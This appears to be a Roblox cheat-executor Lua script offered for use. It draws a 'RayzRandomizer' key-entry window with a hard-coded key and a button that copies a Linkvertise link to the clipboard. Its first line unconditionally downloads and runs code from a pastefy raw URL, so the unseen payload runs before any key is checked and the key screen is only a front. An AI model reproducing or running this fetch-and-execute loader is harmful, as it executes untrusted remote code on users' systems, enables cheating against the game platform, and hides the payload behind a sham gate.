
loadstring(game:HttpGet("https://pastefy.app/ltgVdkP8/raw"))()

local player = game.Players.LocalPlayer
local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
gui.Name = "KeyGui"
gui.ResetOnSpawn = false

local outlineFrame = Instance.new("Frame", gui)
outlineFrame.Name = "OutlineFrame"
outlineFrame.Size = UDim2.new(0, 360, 0, 220)
outlineFrame.Position = UDim2.new(0.5, -180, 0.5, -125)
outlineFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
outlineFrame.BorderSizePixel = 0
outlineFrame.BackgroundTransparency = 1

local outlineCorner = Instance.new("UICorner", outlineFrame)
outlineCorner.CornerRadius = UDim.new(0, 22)

local frame = Instance.new("Frame", outlineFrame)
frame.Name = "MainFrame"
frame.Size = UDim2.new(1, -10, 1, -10)
frame.Position = UDim2.new(0, 5, 0, 5)
frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
frame.BorderSizePixel = 0
frame.BackgroundTransparency = 1

local uicorner = Instance.new("UICorner", frame)
uicorner.CornerRadius = UDim.new(0, 20)

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, -40, 0, 30)
title.Position = UDim2.new(0, 20, 0, 10)
title.Text = "RayzRandomizer"
title.Font = Enum.Font.GothamBold
title.TextSize = 24
title.TextColor3 = Color3.fromRGB(0, 0, 0)
title.BackgroundTransparency = 1
title.TextXAlignment = Enum.TextXAlignment.Left

local subtitle = Instance.new("TextLabel", frame)
subtitle.Size = UDim2.new(1, -40, 0, 20)
subtitle.Position = UDim2.new(0, 20, 0, 45)
subtitle.Text = "Enter Your Key"
subtitle.Font = Enum.Font.Gotham
subtitle.TextSize = 18
subtitle.TextColor3 = Color3.fromRGB(0, 0, 0)
subtitle.BackgroundTransparency = 1
subtitle.TextXAlignment = Enum.TextXAlignment.Left

local textbox = Instance.new("TextBox", frame)
textbox.Size = UDim2.new(1, -40, 0, 35)
textbox.Position = UDim2.new(0, 20, 0, 75)
textbox.PlaceholderText = "put key"
textbox.Font = Enum.Font.Gotham
textbox.TextSize = 18
textbox.Text = ""
textbox.TextColor3 = Color3.fromRGB(0, 0, 0)
textbox.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
textbox.BorderSizePixel = 0

local boxCorner = Instance.new("UICorner", textbox)
boxCorner.CornerRadius = UDim.new(0, 12)

local option = Instance.new("TextLabel", frame)
option.Size = UDim2.new(1, -40, 0, 20)
option.Position = UDim2.new(0, 25, 0, 115)
option.Text = "Linkvertise"
option.Font = Enum.Font.GothamBold
option.TextSize = 16
option.TextColor3 = Color3.fromRGB(0, 0, 0)
option.BackgroundTransparency = 1
option.TextXAlignment = Enum.TextXAlignment.Left

local checkButton = Instance.new("TextButton", frame)
checkButton.Size = UDim2.new(0, 130, 0, 35)
checkButton.Position = UDim2.new(0, 30, 0, 150)
checkButton.Text = "Check Key"
checkButton.Font = Enum.Font.GothamBold
checkButton.TextSize = 18
checkButton.TextColor3 = Color3.fromRGB(0, 0, 0)
checkButton.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
checkButton.BorderSizePixel = 0

local checkCorner = Instance.new("UICorner", checkButton)
checkCorner.CornerRadius = UDim.new(0, 14)

local lockButton = Instance.new("TextButton", frame)
lockButton.Size = UDim2.new(0, 95, 0, 75)
lockButton.Position = UDim2.new(0, 190, 0, 125)
lockButton.Text = "ðŸ”’"
lockButton.Font = Enum.Font.Gotham
lockButton.TextSize = 40
lockButton.TextColor3 = Color3.fromRGB(0, 0, 0)
lockButton.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
lockButton.BorderSizePixel = 0

local lockCorner = Instance.new("UICorner", lockButton)
lockCorner.CornerRadius = UDim.new(0, 10)

-- Fade in
for i = 1, 10 do
	outlineFrame.BackgroundTransparency = 1 - (i * 0.1)
	frame.BackgroundTransparency = 1 - (i * 0.1)
	wait(0.03)
end

-- Key check logic
local correctKey = "Rayzhub" -- Replace with your actual key

lockButton.MouseButton1Click:Connect(function()
	if textbox.Text == correctKey then
		local validLabel = Instance.new("TextLabel")
		validLabel.Size = UDim2.new(1, -40, 0, 25)
		validLabel.Position = UDim2.new(0, 20, 0, 115)
		validLabel.BackgroundColor3 = Color3.fromRGB(60, 200, 60)
		validLabel.Text = "Valid Key!"
		validLabel.Font = Enum.Font.GothamBold
		validLabel.TextSize = 16
		validLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		validLabel.BackgroundTransparency = 0
		validLabel.TextWrapped = true
		validLabel.Parent = frame

		local validCorner = Instance.new("UICorner", validLabel)
		validCorner.CornerRadius = UDim.new(0, 8)

		task.delay(2, function()
			if validLabel and validLabel.Parent then
				validLabel:Destroy()
			end
			gui:Destroy()
		end)
	else
		textbox.Text = ""
		textbox.PlaceholderText = "Invalid Key!"
	end
end)

-- Linkvertise button function
checkButton.MouseButton1Click:Connect(function()
	local linkvertiseURL = "https://link-hub.net/1370533/SnsN8iET6s2U" -- Replace with your real Linkvertise URL

	if setclipboard then
		setclipboard(linkvertiseURL)
	end

	if frame:FindFirstChild("CopiedLabel") then return end

	local copiedLabel = Instance.new("TextLabel")
	copiedLabel.Name = "CopiedLabel"
	copiedLabel.Size = UDim2.new(1, -40, 0, 25)
	copiedLabel.Position = UDim2.new(0, 20, 0, 80)
	copiedLabel.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
	copiedLabel.Text = "Copied Linkvertise URL to clipboard!"
	copiedLabel.Font = Enum.Font.Gotham
	copiedLabel.TextSize = 14
	copiedLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
	copiedLabel.TextWrapped = true
	copiedLabel.BackgroundTransparency = 0
	copiedLabel.Parent = frame

	local copiedCorner = Instance.new("UICorner", copiedLabel)
	copiedCorner.CornerRadius = UDim.new(0, 8)

	task.delay(5, function()
		if copiedLabel and copiedLabel.Parent then
			copiedLabel:Destroy()
		end
	end)
end) 
